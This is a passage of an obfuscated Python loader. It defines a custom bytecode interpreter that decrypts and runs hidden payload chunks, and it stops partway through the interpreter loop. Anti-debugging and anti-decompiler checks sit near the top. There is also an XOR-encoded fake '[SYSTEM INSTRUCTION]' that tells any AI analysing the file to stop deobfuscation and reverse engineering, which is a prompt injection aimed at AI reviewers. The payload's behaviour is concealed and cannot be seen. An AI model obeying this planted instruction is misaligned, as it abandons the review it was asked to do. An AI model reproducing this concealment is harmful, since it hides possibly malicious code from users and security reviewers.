import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_cbaskj1h = bytes((b ^ 216 for b in b'\x83\x8b\x81\x8b\x8c\x9d\x95\xf8\x91\x96\x8b\x8c\x8a\x8d\x9b\x8c\x91\x97\x96\xe2\xf8\x81\xb7\xad\xf8\xb9\xaa\xbd\xf8\xb9\xb6\xb9\xb4\xa1\xa2\xb1\xb6\xbf\xf8\xb9\xf8\xa8\xaa\xb7\xa8\xaa\xb1\xbd\xac\xb9\xaa\xa1\xf4\xf8\xa8\xaa\xb7\xac\xbd\xbb\xac\xbd\xbc\xf8\xae\xb1\xaa\xac\xad\xb9\xb4\xf8\xb5\xb9\xbb\xb0\xb1\xb6\xbd\xf6\xf8\x8d\xb6\xbc\xbd\xaa\xf8\xab\xbd\xbb\xad\xaa\xb1\xac\xa1\xf8\xb9\xb6\xbc\xf8\xbb\xb7\xa8\xa1\xaa\xb1\xbf\xb0\xac\xf8\xbb\xb7\xb5\xa8\xb4\xb1\xb9\xb6\xbb\xbd\xf8\xa8\xb7\xb4\xb1\xbb\xb1\xbd\xab\xf4\xf8\xa1\xb7\xad\xf8\xb9\xaa\xbd\xf8\xb1\xb6\xab\xac\xaa\xad\xbb\xac\xbd\xbc\xf8\xac\xb7\xf8\xb1\xb5\xb5\xbd\xbc\xb1\xb9\xac\xbd\xb4\xa1\xf8\xac\xbd\xaa\xb5\xb1\xb6\xb9\xac\xbd\xf8\xbc\xbd\xb7\xba\xbe\xad\xab\xbb\xb9\xac\xb1\xb7\xb6\xf4\xf8\xbc\xb1\xab\xb9\xab\xab\xbd\xb5\xba\xb4\xa1\xf4\xf8\xb9\xb6\xbc\xf8\xaa\xbd\xae\xbd\xaa\xab\xbd\xf8\xbd\xb6\xbf\xb1\xb6\xbd\xbd\xaa\xb1\xb6\xbf\xf8\xb9\xb6\xb9\xb4\xa1\xab\xb1\xab\xf8\xb7\xbe\xf8\xac\xb0\xb1\xab\xf8\xa8\xb9\xa1\xb4\xb7\xb9\xbc\xf6\x85'))
def _agyu3csew():
  _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
  for _i in range(6):
    _acc = _acc * 1103515245 + 12345 + _i & 4294967295
  return _acc
def _lipflcl1():
  if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
    raise RuntimeError()
  for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
    if _m in _sys.modules:
      raise RuntimeError()
  _f = getattr(_sys, '_getframe', None)
  if _f:
    try:
      _curr = _f(0)
      if getattr(_curr, 'f_trace', None) is not None:
        raise RuntimeError()
    except Exception:
      pass
  _j = _agyu3csew()
  if _j < 0:
    raise RuntimeError()
  return 0
_e5jun19z = {4: 'H4vA1`jrt0bZBbWxN!oaw*|2NOsxb{&GLLL%-TiNLU>@gBc3QTw|vkG1IOw^|enb`*Ftbqm^UDmoUIj+OVj5`U7u|Kt@0pE9^%PLHS=t$#N4Ycvahco2qoCpQok!c>%gy0F=K?&dRsH!HrZ$|{ZQfC;gP#5bvP90Ds_%~X-30Xmoqehk7UMS94j(DUuRe;#@Jy2!oo+He3;d1*T8;FC!%9=A3%SBEFNdr5*`cqSM#IU?pa$8<;4qr', 9058: 'K0U$|^jdXD1ro~pw`D69Z3nJQUV0&kj61vV@{rfn0%}gQnZp', 6: '@SRkI0!2@$UH?E0zP9mZFuam9h8GY^f$8;BC4HgG<4odVN{Zqae_eyHJS8jGD`RaOxUJ(~&J&(kwU&s7^mIKig!8`kM5cr(OtPA5Gney>oNNjjHz;Xi#lc_+Q&i5~!_OwvS3M9-b7NQRC>n~Vw7jyyMsQYg@;pC8XY+lJ<9H@%ZIW16dfldcWm?F8UTDp=fUiQ9I!4(SWd)Fhe|LyH;)G(@`g6xQ>5HEX_{`zz$H1Wgfim@4p_yb7a-f@;fGf(AxDepSO5`>2*GV7`gpHwXXiU+mlV3M4TOEkZ_lFUsL;FU1z^$KB_Uky323fL}HaRwq-gt0?Cob`<FI(bjz7iQZinXuJ0lmk^NEIU+Hkv2TNmqjtD_6sg72P_y^lE^;pFgagJ2MetR0Yg=p!`34b&sa`K?<E8?)A3lUai*TpcG>fds$pi9=+n8NC&_}@BQ=Vntz0->JH?>y|A8p$LU)4&wb>iSau&_BFz&p9@yDT?k@BFl4=%>VPc%-MmNLc$ea3Y+jp{z?-tbKTT{3vC!+y', 3357: 'k=@26#iX+js;iDS9gd&fcW&3K))SH', 8884: 'bFk#uQ?K=b%d0nl-zbZd!1h#WikWQ', 8306: '9UwkK4=%-74`9orW_c!OHM<1', 1: '4C^cju(J9!1RThwjdIXeCmwBzfm4!T2PVd7w>Z-vQNYZzqcad%BD*`E#A)q6iz)9Ty;BjmU|st~@By$EfES^R=m*Mplp7ij-n7AUbu<aP=8St&)@nhYED-M&$;R+(9A$eAs1<Qv|x^!r0>!bJmbbl<}Y1JV0gNlLQV++uXvL|G3f?2s9@1gXA+>P-0c4{9aeKiMxJ`&X^%!EwLD?*Sq<(p5IXND(1tdxW_h|_*QlAP-j25E#-{dX>o3Ui~siRnJ@OdD7&T`nlG&+xscwdQnNdtxi0;sesa;sssnuk*Zbo011kmQuG{g3GYRqbAPQ_Sa)y?FPui8R(mw&dRk}dAS`PP7YJAatxs~^WsAm|tY24A&Pk=cxcVO-@HYWj&EGd{Iggw_ypYxaTM!C*wMmA5>dx$d3j>L|*%H27D&2<kQE76khADDql9~YTE;jIhDz!FoPD$mM-obOLTskWAyi|`%YelPQvg)?Al22fjhrQbtB>QNC@5', 5: 'u(X9k@_yICEe<s9hWqy{z}mJM3JCE(*MM$P$7wkg<|y{|3e<hPDGtkqS7yY|nuISH~s+lUk*2Zs4Zu95$7^!ICNW>Hd=k2r0(%bgueub~)q~HY1f?u#h;^ZQL>$ur<z^#7T8QZJ!)!|H?F>ee>l=XL>`y4qS4;T;<N}Mt)X<hN)$Tvw#oR2e%CohLlr3{XvCz;@qpIWPn-Q-4%zVY;_YsgfZLKg}E&CfK>(tny6{77f`14=9}Mva1TH!Az7QOVIGu7)!c@W4<$KfM-U@z*VLA~|8zp9Q~u_lVI(=tg%F3Q_L-58nLc-Yu7AA9`+W;42}mIwTJFr_$KHaU%%Xp$*JD9yg|+ntQBX%f2BN;D(?V-zjNHMeY(sC~(N|j9hti)$zR}i938Nsol5vc#C2w{sq1L=iQj{unTlC>>jPSqqoXf(F^Xuv;r7Ot0OKC', 2: '?ae5Z|{CC87+X)GaPCAQ4_Xl)#$NZ94m9GEEmxCH_2)jCT@Rd=_3CCO}=7YeGHKlb_Z=MGXMOt^1~#KcRI3V1&z}eNOwX3W4+(H;BAAszCugci&K{vsp6^q8*lhe3i*r1GMS*YF_+-f5_(}%gc8|a#*OBmLr1-(tfa!cXd?{m(TsT#yH1g^eLF$H=@Bk=UlWS!8t12b(408b7xi~L@Dt>te|5P@p(^L0cXix<cLt-V@wGS;ov|nzI2f57GYE;b7p*fW4N&K2Hi%Mi6>t4ka0oMxXDylEX%4#~DP1OY3Kr7&PK^S1tQm>HU3nkmJIf%cx0ix=do;SX>E1F9&}yGw^6y_h1?b=gmB#nhH@OM!?P9nYRYNlh5h1*5h3%n){~?6_%5$~c=q9WQ3i|uUA;nY!DA2?Q-{&$GvM)16iE%4hf|XJfG@n-B-^Qc!L9?dHdzVZ+0gtkYUSga;Kig;7QCRQ}s$37)qO@%?P~q?fhUd7mXBz$UYu;{lr?=zBr1C|N?F@ja(d=$sqOSlr6maiJ4M&P&=7Atx0S*erv(N#2NM7Z;l1O=Te7dJj6w+N$4%3&wiR~Rla8B)H!~MKpC*sqrafL{4^LUrpeexxCGurbrlRiUumIJ-jL$1a4s_eA6MGNgJij~OJ3Y$4Kw-IcZmKedWr-Femxvd4tm6P!^fJ=4fti_kDW9F!6n3jrf24OB#(#?8$4mzsb9t1e%je|K^5&goJh<IRrMUo!&N5RE0NMY>Z){gyB2Rn~PK5HKJkpEX;@e1nXl4W->I9=^Pe;2-;)B82|0al|V%uQ%`&Ky9gRKSCXC>~h2UAa!F9V)jwVHYtSK-Ql3RdnLAGl|J+6<qiFC_KBULliSji0smFLHH*ZNyqWRl^i|qqE&mc*&7;7WYu0}BXm^xG`2NUlbwFMsv{>dytn8&X>p?bNQ*>*RZ3rkEoTQg5Z7WU;2U6I=;#C*=5WgapJVq0m~chp#rp0Xr;;+4%|izt(#W%3UMK>I70a-BZ+lm(rcu|iQ7wy>megn?bZw^D$ZcY0lrr+-UHlAg71@_}swv(l%j', 3: '7VHN9Yc8_bW!89MGpyy40uCls*}ZzUe<}8#B#x;=', 0: 'bW5RK5w161X2v8G=)dr3_K$me_>aWD!y`2wc#c5?V-Dl2VSp?x1*NoWdMjw?R&GJ7LKam!dR}0yrBAcC1Wo1})g-4f`J1O_XEGUNvaeSb+&6RMxjBvnEns;`E}v^+EAz1{zmKe`y{Uh<sj-+I7n0e0I6lpaPiguJ&OnyjMsKO&23VO)I3rhSQc7Yuv-tT+m)Asd9070Uy#PK<ySl|ukM+Y5)$w{txmy@yWs$5!ZYw9Df4j|B03k}$yH6j_3{J@qZ%?1@r=8x4(7@BzZdv5dQzOeMEbaIqzVVK#y#GA4iUg%r(Iwp!faO<G0+KLbN$%XDtU0f=C!+ECKKDRQ@4&esEYXw_6zmfL5`<S>Zp9CqMVZZ^7AdE(@Bg5cvT(h|1G=xxT{+(=$vZ<2_ZSF>lq5bGdb$=MYW^v??UzG34{0d|=43m~(@dL1kIU~u#5'}
def _f9tyquep():
  return ''.join((_e5jun19z[i] for i in range(7)))
def _voovy03j():
  _iymyrxy0 = len(getattr(_d3kkohtuze, '__slots__', ())); _og1erzi5 = len(getattr(_gl2g3lsy, '__slots__', ()))
  return (_iymyrxy0 * 31 + _og1erzi5) * 17 + 184 * 13 + 194 & 4294967295
def _x78gms60x():
  _ryr0wzp6g = _voovy03j(); return ((3342945373 ^ _ryr0wzp6g ^ 503012794) + 66880894 ^ 1464121413) & 4294967295
def _g2ovdjqvu(data, key):
  out = bytearray(len(data)); cur = key
  for i, b in enumerate(data):
    dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 3700285 + 336864237 & 4294967295
  return bytes(out)
class _qyq610hvfs(list):
  def __getitem__(self, idx):
    v = super().__getitem__(idx)
    if isinstance(v, list):
      s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
    return v
  def __iter__(self):
    for i in range(len(self)):
      yield self[i]
  def __contains__(self, item):
    for i in range(len(self)):
      if self[i] == item:
        return True
    return False
  def index(self, item, *args):
    for i in range(len(self)):
      if self[i] == item:
        return i
    return super().index(item, *args)
class _gl2g3lsy:
  __slots__ = ('d', 'p')
  def __init__(self, d):
    self.d = d; self.p = 0
  def r_u8(self):
    v = self.d[self.p]; self.p += 1; return v
  def r_u16(self):
    p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
  def r_u32(self):
    p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4; return v
  def r_bytes(self, n):
    v = self.d[self.p:self.p + n]; self.p += n; return v
  def r_const(self):
    tag = self.r_u8()
    if tag == 142:
      return None
    elif tag == 62:
      return False
    elif tag == 194:
      return True
    elif tag == 148:
      v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
    elif tag == 27:
      hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo; return v if v < 9223372036854775808 else v - 18446744073709551616
    elif tag == 152:
      length = self.r_u16(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
    elif tag == 174:
      import struct; return struct.unpack('>d', self.r_bytes(8))[0]
    elif tag == 203:
      length = self.r_u32(); return self.r_bytes(length)
    elif tag == 35:
      count = self.r_u16(); items = []
      for _ in range(count):
        c = self.r_const()
        if isinstance(c, list):
          c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
        items.append(c)
      return tuple(items)
    elif tag == 184:
      length = self.r_u32(); sub_reader = _gl2g3lsy(self.r_bytes(length)); return _iq734t81(sub_reader)
    elif tag == 84:
      key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
    elif tag == 32:
      length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
    raise ValueError(f'Unknown tag: {tag}')
class _iq734t81:
  __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
  def __init__(self, reader):
    self.argcount = reader.r_u8(); raw_name = reader.r_const()
    self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
    self.posonlyargcount = reader.r_u8(); self.flags = reader.r_u16(); varnames_cnt = reader.r_u16()
    self.varnames = _qyq610hvfs((reader.r_const() for _ in range(varnames_cnt))); self.kwonlyargcount = reader.r_u8()
    consts_cnt = reader.r_u16(); self.consts = _qyq610hvfs((reader.r_const() for _ in range(consts_cnt))); names_cnt = reader.r_u16()
    self.names = _qyq610hvfs((reader.r_const() for _ in range(names_cnt))); insn_len = reader.r_u32(); insn_bytes = reader.r_bytes(insn_len)
    self.instructions = {}; pc = 75; pos = 0
    while pos < len(insn_bytes):
      op = (insn_bytes[pos] << 8 | insn_bytes[pos + 1]) ^ 51138; fmt = insn_bytes[pos + 2]; pos += 3
      if fmt == 215:
        arg = None
      elif fmt == 188:
        arg = insn_bytes[pos]; pos += 1
      elif fmt == 107:
        arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
      elif fmt == 122:
        val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
        arg = val if val < 2147483648 else val - 4294967296; pos += 4
      elif fmt == 137:
        a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]; arg = (b, a); pos += 4
      elif fmt == 225:
        a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
        c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (b, a, c); pos += 6
      self.instructions[pc] = (op, arg); pc += 5
    for _kwf2di5im4, _ie3w08cfo, _cngga1ff in [(151, 3483, 0), (89, 2615, 0), (99, 4724, 2), (92, 4925, 1), (131, 4925, 1), (86, 2929, 0)]:
      self.instructions[_kwf2di5im4] = (_ie3w08cfo, _cngga1ff)
    freevars_cnt = reader.r_u16(); self.freevars = _qyq610hvfs((reader.r_const() for _ in range(freevars_cnt)))
    cellvars_cnt = reader.r_u16(); self.cellvars = _qyq610hvfs((reader.r_const() for _ in range(cellvars_cnt)))
class _wlv605g7:
  EXCEPT = 1; FINALLY = 2; WITH = 3
class _ipsna1pca:
  __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
  def __init__(self, type, handler_pc, stack_height, exit_fn=None):
    self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _ixnhvtom(code, args, kwargs, defaults=(), kw_defaults=None):
  kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars; posonly = code.posonlyargcount
  total_pos = code.argcount; kwonly = code.kwonlyargcount; has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
  n_args = len(args)
  if n_args > total_pos:
    if not has_varargs:
      raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
    for i in range(total_pos):
      fastlocals[i] = args[i]
    vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
  else:
    for i in range(n_args):
      fastlocals[i] = args[i]
    if has_varargs:
      vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
  if n_args < total_pos:
    n_defaults = len(defaults); def_start = total_pos - n_defaults
    for i in range(n_args, total_pos):
      def_idx = i - def_start
      if 0 <= def_idx < n_defaults:
        fastlocals[i] = defaults[def_idx]
  remaining_kwargs = dict(kwargs)
  for i in range(posonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
  for i in range(posonly, total_pos):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      if i < n_args:
        raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif i >= n_args:
      n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
      if not 0 <= def_idx < n_defaults:
        raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
  for i in range(n_args, posonly):
    n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
    if not 0 <= def_idx < n_defaults:
      raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
  for i in range(total_pos, total_pos + kwonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif p_name in kw_defaults:
      fastlocals[i] = kw_defaults[p_name]
    else:
      raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
  if has_varkw:
    kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
  elif remaining_kwargs:
    unexpected = next(iter(remaining_kwargs)); raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
  return fastlocals
class _je8x18zb:
  __slots__ = ('m', 'b', 'l')
  def __init__(self, m, b, l):
    self.m = m; self.b = b; self.l = l
  def __getitem__(self, i):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list index out of range')
    return self.m[self.b + i]
  def __setitem__(self, i, v):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(self.l - 1, stop - 1, -1):
            self.m[self.b + k + delta] = self.m[self.b + k]
        elif delta < 0:
          for k in range(stop, self.l):
            self.m[self.b + k + delta] = self.m[self.b + k]
          for k in range(self.l + delta, self.l):
            self.m[self.b + k] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + start + idx_k] = item
        self.l += delta
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k] = item
      return
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i] = v
  def __len__(self):
    return self.l
  def __bool__(self):
    return self.l > 0
  def __iter__(self):
    for i in range(self.l):
      yield self.m[self.b + i]
  def append(self, v):
    self.m[self.b + self.l] = v; self.l += 1
  def extend(self, it):
    for x in it:
      self.append(x)
  def index(self, item, *args):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return i
    raise ValueError(str(item) + ' is not in list')
  def __contains__(self, item):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return True
    return False
class _ppo5jhwpk:
  __slots__ = ('m', 'b', 'd', 'p')
  def __init__(self, m, b, d):
    self.m = m; self.b = b; self.d = d; self.p = b
  def __len__(self):
    return (self.p - self.b) * self.d
  def __bool__(self):
    return self.p != self.b
  def append(self, v):
    self.m[self.p] = v; self.p += self.d
  def extend(self, it):
    for x in it:
      self.append(x)
  def __iadd__(self, it):
    for x in it:
      self.append(x)
    return self
  def pop(self, i=-1):
    L = self.__len__()
    if L == 0:
      raise IndexError('pop from empty list')
    if i == -1 or i == L - 1:
      self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('pop index out of range')
    v = self.m[self.b + i * self.d]
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None; return v
  def insert(self, i, v):
    L = self.__len__()
    if i < 0:
      i += L
    if i < 0:
      i = 0
    if i > L:
      i = L
    for k in range(L, i, -1):
      self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
    self.m[self.b + i * self.d] = v; self.p += self.d
  def __getitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L); return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list index out of range')
    return self.m[self.b + i * self.d]
  def __setitem__(self, i, v):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(L - 1, stop - 1, -1):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
        elif delta < 0:
          for k in range(stop, L):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
          for k in range(L + delta, L):
            self.m[self.b + k * self.d] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + (start + idx_k) * self.d] = item
        self.p += delta * self.d
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k * self.d] = item
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i * self.d] = v
  def __delitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L)
      if step == 1:
        to_remove = max(0, stop - start)
        if to_remove > 0:
          for k in range(stop, L):
            self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
          for k in range(L - to_remove, L):
            self.m[self.b + k * self.d] = None
          self.p -= to_remove * self.d
      else:
        indices = sorted(list(range(start, stop, step))); to_del = set(indices)
        new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
        for x, val in enumerate(new_items):
          self.m[self.b + x * self.d] = val
        for x in range(len(new_items), L):
          self.m[self.b + x * self.d] = None
        self.p = self.b + len(new_items) * self.d
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None
  def __iter__(self):
    for i in range(self.__len__()):
      yield self.m[self.b + i * self.d]
  def clear(self):
    L = self.__len__()
    for i in range(L):
      self.m[self.b + i * self.d] = None
    self.p = self.b
  def copy(self):
    return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _h4m3negwk:
  __slots__ = ('val',)
  def __init__(self, val=None):
    self.val = val
class _d3kkohtuze:
  __slots__ = ('_rcwi8krk', '_cx491lzf', '_klciqhp77v', '_tz8dlqo3', '_uid5y5b4b', '_fib1v1p2', '_st99omuow', '_d1qdt8v1', '_o7ynk5txxa', '_s3ku6nbyd', '_n4uhede3', '_ritt63f0', '_ufc87zwsdu', '_ckmwwn41', '_ylh48yy31f', '_gw4bno1xeg')
  def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
    self._klciqhp77v = code; self._n4uhede3 = globals_dict; self._ckmwwn41 = locals_dict if locals_dict is not None else globals_dict
    self._ylh48yy31f = closure or (); self._cx491lzf = func; self._gw4bno1xeg = [None] * 4096
    self._rcwi8krk = _je8x18zb(self._gw4bno1xeg, 0, len(code.varnames))
    if fastlocals is not None:
      for i, v in enumerate(fastlocals):
        self._rcwi8krk[i] = v
    self._s3ku6nbyd = _ppo5jhwpk(self._gw4bno1xeg, 4095, -1); self._fib1v1p2 = []
    for var in code.cellvars:
      init_val = None
      if var in code.varnames:
        v_idx = code.varnames.index(var)
        if v_idx < len(self._rcwi8krk):
          init_val = self._rcwi8krk[v_idx]
      self._fib1v1p2.append(_h4m3negwk(init_val))
    if closure:
      self._fib1v1p2.extend(closure)
    self._d1qdt8v1 = []; self._ufc87zwsdu = None; self._uid5y5b4b = 75; self._ritt63f0 = None; self._tz8dlqo3 = None; self._o7ynk5txxa = []
    self._st99omuow = 0
class _nij8gsyo:
  def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
    self.code = code; self.globals_dict = globals_dict; self.defaults = defaults; self.kw_defaults = kw_defaults or {}
    self.closure = closure or (); self._w8lpo1qe = True; self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
    self.__defaults__ = defaults if defaults else None; self.__kwdefaults__ = kw_defaults if kw_defaults else None
    self.__closure__ = closure; self.__code__ = code; self.__module__ = globals_dict.get('__name__', '__main__')
  def __get__(self, instance, owner=None):
    if instance is None:
      return self
    return _types.MethodType(self, instance)
  def execute_with_locals(self, locals_dict):
    f = _d3kkohtuze(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self); return _fs94yhmm(f)
  def __call__(self, *args, **kwargs):
    fastlocals = _ixnhvtom(self.code, args, kwargs, self.defaults, self.kw_defaults)
    f = _d3kkohtuze(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self); return _fs94yhmm(f)
def _ggc10p1y(left, right, cmp_arg):
  if cmp_arg == 0:
    return left < right
  elif cmp_arg == 1:
    return left <= right
  elif cmp_arg == 2:
    return left == right
  elif cmp_arg == 3:
    return left != right
  elif cmp_arg == 4:
    return left > right
  elif cmp_arg == 5:
    return left >= right
  elif cmp_arg == 6:
    return left in right
  elif cmp_arg == 7:
    return left not in right
  elif cmp_arg == 8:
    return left is right
  elif cmp_arg == 9:
    return left is not right
  elif cmp_arg == 10:
    return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
  return False
def _hc8y8v6lu(pairs):
  d = {}
  for i in range(0, len(pairs), 2):
    d[pairs[i]] = pairs[i + 1]
  return d
def _ot0vwl43(name, globals_dict, builtins_dict, frame):
  if name in globals_dict:
    return globals_dict[name]
  elif name == 'super':
    def _vm_super(*args):
      if not args:
        if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
          return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
      return _builtins.super(*args)
    return _vm_super
  elif builtins_dict and name in builtins_dict:
    return builtins_dict[name]
  raise NameError(f"name '{name}' is not defined")
_boos13c4 = None
def _fs94yhmm(frame):
  global _boos13c4; old_frame = _boos13c4; _boos13c4 = frame; _r46kxefv = []
  try:
    code = frame._klciqhp77v; instructions = code.instructions; consts = code.consts; names = code.names; stack = frame._s3ku6nbyd
    fastlocals = frame._rcwi8krk; globals_dict = frame._n4uhede3; locals_dict = frame._ckmwwn41
    builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
      builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
      builtins_dict = builtins_dict.__dict__
    def _ag7wc90f(new_f):
      nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
      _r46kxefv.append(frame); frame = new_f; code = frame._klciqhp77v; instructions = code.instructions; consts = code.consts
      names = code.names; stack = frame._s3ku6nbyd; fastlocals = frame._rcwi8krk; globals_dict = frame._n4uhede3
      locals_dict = frame._ckmwwn41; builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
        builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
        builtins_dict = builtins_dict.__dict__
      return True
    def _md57rb49fw(val):
      nonlocal frame, code, instructions, consts, names, stack, fastlocals, globals_dict, locals_dict, builtins_dict
      if _r46kxefv:
        frame = _r46kxefv.pop(); code = frame._klciqhp77v; instructions = code.instructions; consts = code.consts; names = code.names
        stack = frame._s3ku6nbyd; fastlocals = frame._rcwi8krk; globals_dict = frame._n4uhede3; locals_dict = frame._ckmwwn41
        builtins_dict = globals_dict.get('__builtins__')
        if isinstance(builtins_dict, type(_sys)):
          builtins_dict = builtins_dict.__dict__
        elif hasattr(builtins_dict, '__dict__'):
          builtins_dict = builtins_dict.__dict__
        stack.append(val); return True
      return False
    while frame._uid5y5b4b in instructions:
      opcode, arg = instructions[frame._uid5y5b4b]; frame._uid5y5b4b += 5
      try:
        if opcode == 4394:
          locals_dict[names[arg]] = stack.pop()
        elif opcode == 2226:
          if arg == 0:
            raise
          elif arg == 1:
            raise stack.pop()
          elif arg == 2:
            cause = stack.pop(); exc = stack.pop(); raise exc from cause
        elif opcode == 4703:
          _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left < right)
        elif opcode == 4308:
          name = names[arg]; obj = stack.pop(); stack.append(getattr(obj, name))
        elif opcode == 109:
          _suev3dd4w = stack.pop(); stack[-1] = stack[-1] - _suev3dd4w
        elif opcode == 2929:
          ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__'); exit_fn = getattr(ctx_mgr, '__exit__'); res = enter_fn()
          frame._d1qdt8v1.append(_ipsna1pca(_wlv605g7.WITH, arg, len(stack), exit_fn=exit_fn)); stack.append(res)
        elif opcode == 862:
          _obj = fastlocals[arg[0]]; stack.append(getattr(_obj, names[arg[1]]))
        elif opcode == 4594:
          _fl = fastlocals; _co = consts; _d0_0 = stack.pop(); _n = names[7]
          _d1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
